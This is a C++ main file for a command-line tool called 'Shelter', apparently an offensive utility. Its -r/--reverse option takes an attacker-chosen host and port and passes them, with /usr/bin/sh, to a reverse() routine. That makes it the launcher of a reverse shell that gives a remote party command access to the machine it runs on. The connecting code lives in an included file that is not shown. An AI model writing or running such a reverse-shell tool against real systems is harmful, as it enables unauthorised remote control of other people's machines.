#include "src/Shelter.cpp"
#include <argh.h>
#include <string>
#include <boost/lexical_cast.hpp>

using std::string;
using namespace argh;

int main(int argc, char* argv[])
{
    Shelter app;
    parser cmdl;

    cmdl.parse(argc, argv, parser::PREFER_PARAM_FOR_UNREG_OPTION);

    app.showBanner();

    if(cmdl[{"-h", "--help"}]) {
        app.showHelp();
        return -1;
    }

    else if(cmdl[{"-r", "--reverse"}]) {
        string host;
        string shell = "/usr/bin/sh";
        unsigned short port;

        for(auto& param : cmdl.params()) {
            if(param.first == "H") host = param.second;
            else if(param.first == "P") {
                port = boost::lexical_cast<unsigned short>(param.second);
            }
        }
        app.reverse(host, port, shell);
    }
    else {
        app.showHelp();
    }
    return 0;
}
